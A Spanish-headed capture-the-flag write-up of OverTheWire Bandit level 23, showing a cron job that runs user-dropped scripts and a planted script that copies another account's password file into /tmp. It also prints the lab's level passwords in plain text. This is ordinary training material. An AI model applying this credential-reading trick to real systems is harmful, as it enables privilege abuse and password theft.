# Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
# Datos de acceso al nivel
username = bandit23
password = QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
# Solución
```
bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cd /usr/bin/cronjob_bandit24.sh
-bash: cd: /usr/bin/cronjob_bandit24.sh: Not a directory
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ cd /var/spool/$myname/foo
-bash: cd: /var/spool//foo: No such file or directory
bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24/foo$ mkdir /tmp/bandit23
mkdir: cannot create directory ‘/tmp/bandit23’: File exists
bandit23@bandit:/var/spool/bandit24/foo$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ touch /var/spool/bandit24/foo/script.sh
bandit23@bandit:/var/spool/bandit24/foo$ chmod +x /var/spool/bandit24/foo/script.sh
bandit23@bandit:/var/spool/bandit24/foo$ nano /var/spool/bandit24/foo/script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/bandit23/password.txt.
cat: /tmp/bandit23/password.txt.: No such file or directory
bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/bandit23/password.txt
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

script: 
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit23/password.txt

```
# Notas adicionales
Chmod: se usa para cambiar permisos.
# Referencias
- [OverTheWire: Updated Bandit Walkthrough — Level 23 | by Samxia99 | Feb, 2024 | Medium](https://medium.com/@samarthkokil64/overthewire-updated-bandit-walkthrough-level-23-7b636a48dbcd)